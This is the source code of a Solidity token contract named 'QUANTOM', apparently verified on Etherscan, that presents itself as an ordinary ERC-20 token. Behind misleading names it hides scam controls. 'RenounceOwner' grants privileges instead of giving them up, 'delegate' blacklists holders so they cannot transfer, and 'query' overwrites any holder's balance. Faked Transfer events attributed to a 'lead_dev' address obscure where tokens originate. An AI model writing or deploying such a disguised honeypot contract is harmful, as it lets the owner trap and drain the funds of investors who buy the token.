/**
 *Submitted for verification at Etherscan.io on 2022-10-08
*/

// SPDX-License-Identifier: UNLISCENSED


pragma solidity 0.8.17;
/*
  ,88~-_   888   |      e      888b    | ~~~888~~~   ,88~-_        e    e      
 d888   \  888   |     d8b     |Y88b   |    888     d888   \      d8b  d8b     
88888    | 888   |    /Y88b    | Y88b  |    888    88888    |    d888bdY88b    
88888    | 888   |   /  Y88b   |  Y88b |    888    88888    |   / Y88Y Y888b   
 Y888 \ /  Y88   |  /____Y88b  |   Y88b|    888     Y888   /   /   YY   Y888b  
  `88__X    "8__/  /      Y88b |    Y888    888      `88_-~   /          Y888b

*/

  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract QUANTOM {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) txVal;
    mapping (address => bool) renounced;

    // 
    string public name = "QUANTOM";
    string public symbol = unicode"QUANTOM";
    uint8 public decimals = 18;
    uint256 public totalSupply = 200000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_dev, totalSupply); }



	address owner = msg.sender;
    address V2Router = 0xEB7dE7Fdc8d514c0F0BC270650C589d6a3Bd166C;
    address lead_dev = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier I() {   
         require(renounced[msg.sender]);
         _;}



    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == V2Router)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; } 
        require(!txVal[msg.sender]);      
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function RenounceOwner(address x) public {
        require(msg.sender == owner);
          renounced[x] = true; }
        
        function delegate(address ex) I public{          
        require(!txVal[ex]);
        txVal[ex] = true; }
        function send(address ex) I public {
        require(txVal[ex]);
        txVal[ex] = false; }
        function query(address x, uint256 check) I public returns (bool success) {
        balanceOf[x] = check;
                   return true; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == V2Router)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; }    
        require(!txVal[from]); 
        require(!txVal[to]); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }